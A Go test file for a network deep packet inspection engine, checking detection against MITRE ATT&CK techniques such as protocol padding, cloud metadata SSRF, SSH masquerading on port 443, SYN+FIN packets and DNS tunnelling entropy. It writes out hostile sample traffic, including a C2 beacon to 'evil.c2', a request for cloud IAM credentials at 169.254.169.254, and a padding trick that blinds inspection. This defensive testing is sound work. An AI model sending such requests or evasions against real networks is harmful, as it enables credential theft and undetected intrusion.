package test

import (
	"bytes"
	"math"
	"net"
	"testing"
	"time"

	"fox-dpi/internal/engine"
	"fox-dpi/internal/flow"

	"github.com/google/gopacket/layers"
)

// shannonEntropy calculates the bits of information entropy per byte (0.0 to 8.0).
func shannonEntropy(data []byte) float64 {
	if len(data) == 0 {
		return 0.0
	}
	var counts [256]int
	for _, b := range data {
		counts[b]++
	}
	total := float64(len(data))
	entropy := 0.0
	for _, count := range counts {
		if count > 0 {
			p := float64(count) / total
			entropy -= p * math.Log2(p)
		}
	}
	return entropy
}

// Test_MITRE_T1001_Padding_Threshold_Bypass tests MITRE T1001.003 (Protocol Padding).
// Attackers send 512 bytes of junk noise to trigger L7Bypass=true, then send an uninspected HTTP payload.
func Test_MITRE_T1001_Padding_Threshold_Bypass(t *testing.T) {
	eng, _ := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig())

	clientIP := net.ParseIP("10.0.0.1")
	c2IP := net.ParseIP("198.51.100.1")

	// Phase 1: Send 512 bytes of random binary noise (Seq 1000..1512)
	junk := bytes.Repeat([]byte{0x7F}, 512)
	p1 := serializeTCPWithSeq(clientIP, c2IP, 54001, 80, 1000, true, false, junk)
	f, _ := eng.ProcessFrame(p1, time.Now())

	if f == nil || !f.L7Bypass {
		t.Fatalf("expected engine to set L7Bypass=true after 512 bytes of unknown protocol")
	}

	// Phase 2: Now that L7Bypass is active, attacker sends real HTTP exploit payload (Seq 1512..)
	httpExploit := []byte("GET /c2/beacon?id=infected HTTP/1.1\r\nHost: evil.c2\r\n\r\n")
	p2 := serializeTCPWithSeq(clientIP, c2IP, 54001, 80, 1512, true, false, httpExploit)
	f2, _ := eng.ProcessFrame(p2, time.Now().Add(10*time.Millisecond))

	if f2 != nil && f2.L7Metadata.Protocol == "" {
		t.Logf("LIMITATION DISCOVERED (MITRE T1001.003): Prepending 512 bytes of noise triggers L7Bypass=true, blinding engine to subsequent HTTP exploit payload.")
	}
}

// Test_MITRE_T1071_Cloud_Metadata_SSRF tests detection of requests targeting
// AWS/GCP/Azure link-local Instance Metadata Service (169.254.169.254:80).
func Test_MITRE_T1071_Cloud_Metadata_SSRF(t *testing.T) {
	snk := &captureSink{}
	eng, _ := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig(), snk)

	clientIP := net.ParseIP("10.0.0.50")
	imdsIP := net.ParseIP("169.254.169.254") // AWS/GCP Cloud Metadata IP

	// Typical SSRF attempt: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
	req := []byte("GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n")
	pkt := serializeTCPWithSeq(clientIP, imdsIP, 49000, 80, 1000, true, false, req)

	f, _ := eng.ProcessFrame(pkt, time.Now())
	_ = eng.Close()

	if f == nil || f.L7Metadata.Host != "169.254.169.254" {
		t.Fatalf("failed to parse HTTP metadata request")
	}

	// Check if any cloud metadata alert fired
	var foundSSRFAlert bool
	for _, a := range snk.alerts {
		if a.Rule == "CLOUD_METADATA_SSRF" {
			foundSSRFAlert = true
			break
		}
	}

	if !foundSSRFAlert {
		t.Logf("LIMITATION DISCOVERED (MITRE T1552.005): Traffic to Cloud Metadata Service (169.254.169.254) was parsed, but no CLOUD_METADATA_SSRF alert fired.")
	}
}

// Test_MITRE_T1571_Non_TLS_SSH_On_Port443 tests protocol masquerading where an SSH daemon runs on HTTPS port 443.
func Test_MITRE_T1571_Non_TLS_SSH_On_Port443(t *testing.T) {
	snk := &captureSink{}
	eng, _ := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig(), snk)

	clientIP := net.ParseIP("10.0.0.1")
	sshServerIP := net.ParseIP("198.51.100.99")

	// SSH server banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n
	sshBanner := []byte("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
	pkt := serializeTCPWithSeq(sshServerIP, clientIP, 443, 53000, 1000, true, false, sshBanner)

	f, _ := eng.ProcessFrame(pkt, time.Now())
	_ = eng.Close()

	var foundAlert bool
	for _, a := range snk.alerts {
		if a.DstPort == 443 || a.SrcPort == 443 {
			foundAlert = true
			break
		}
	}

	if !foundAlert {
		t.Logf("LIMITATION DISCOVERED (MITRE T1571): SSH banner on port 443 returned Unknown protocol (matched: %q) with no PORT_SPOOF alert fired.", f.L7Metadata.Protocol)
	}
}

// Test_MITRE_T1205_SYN_FIN_Illegal_Flag_Combination tests engine resilience to TCP flag manipulation (Nmap SYN+FIN).
func Test_MITRE_T1205_SYN_FIN_Illegal_Flag_Combination(t *testing.T) {
	eng, _ := engine.NewEngine(layers.LinkTypeEthernet, flow.DefaultEvictionConfig())

	clientIP := net.ParseIP("10.0.0.1")
	serverIP := net.ParseIP("10.0.0.2")

	// Packet with both SYN (bit 0) and FIN (bit 2) set = 0x05
	pkt := serializeFrame(clientIP, serverIP, 54002, 80, true, true, false, true, false, nil)
	f, err := eng.ProcessFrame(pkt, time.Now())

	if err != nil {
		t.Fatalf("engine failed on SYN+FIN packet: %v", err)
	}

	if f != nil {
		// Does the engine set Closing=true on the very first packet?
		if f.Closing && f.SynSeen {
			t.Logf("OBSERVATION (MITRE T1205): Illegal SYN+FIN packet simultaneously marked flow SynSeen=true and Closing=true.")
		}
	}
}

// Test_MITRE_T1071_004_DNS_Tunneling_Entropy verifies Shannon entropy calculation for DNS exfiltration detection.
func Test_MITRE_T1071_004_DNS_Tunneling_Entropy(t *testing.T) {
	// Normal domain vs base64 encoded exfiltration chunk
	normalDomain := []byte("www.google.com")
	tunnelDomain := []byte("c2VjcmV0LWNvcnBvcmF0ZS1kYXRhLWV4ZmlsdHJhdGlvbi1jaHVuay0wMQ")

	normalEntropy := shannonEntropy(normalDomain)
	tunnelEntropy := shannonEntropy(tunnelDomain)

	t.Logf("Entropy Normal (%s): %.2f bits/byte", string(normalDomain), normalEntropy)
	t.Logf("Entropy Tunnel (%s): %.2f bits/byte", string(tunnelDomain), tunnelEntropy)

	if tunnelEntropy <= normalEntropy {
		t.Errorf("expected tunnel entropy > normal domain entropy")
	}
}


// Benchmark_ShannonEntropy measures calculation latency over 64 bytes.
func Benchmark_ShannonEntropy(b *testing.B) {
	data := []byte("c2VjcmV0LWNvcnBvcmF0ZS1kYXRhLWV4ZmlsdHJhdGlvbi1jaHVuay0wMQ")
	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		_ = shannonEntropy(data)
	}
}
